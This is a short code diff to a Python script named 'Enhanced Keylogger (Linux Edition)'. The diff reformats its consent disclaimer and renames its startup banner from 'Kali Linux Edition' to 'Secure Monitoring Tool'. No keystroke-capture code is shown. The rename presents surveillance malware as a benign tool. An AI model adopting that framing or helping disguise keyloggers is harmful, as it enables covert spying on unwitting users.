@@ -8,9 +8,7 @@
 #  ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝   ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
 #                                    KEYLOGGER (Linux Edition)
 
-# ============================================================
-# ⚠️  FOR EDUCATIONAL PURPOSES ONLY. USE WITH EXPLICIT CONSENT.
-# ============================================================
+# ⚠️  FOR EDUCATIONAL PURPOSES ONLY. USE WITH EXPLICIT CONSENT ⚠️
 
 import os
 import tempfile
@@ -227,10 +225,10 @@ class EnhancedKeylogger:
 
 if __name__ == "__main__":
     print("""
-    ENHANCED KEYLOGGER - KALI LINUX EDITION
+    ENHANCED KEYLOGGER - SECURE MONITORING TOOL
     ===========================================
-    Use only with explicit consent for authorized purposes.
-    Unauthorized use violates privacy laws and ethics.
+    Use only with explicit consent for authorized purposes
+    Unauthorized use violates privacy laws and ethics
     ===========================================
     """)
     try:
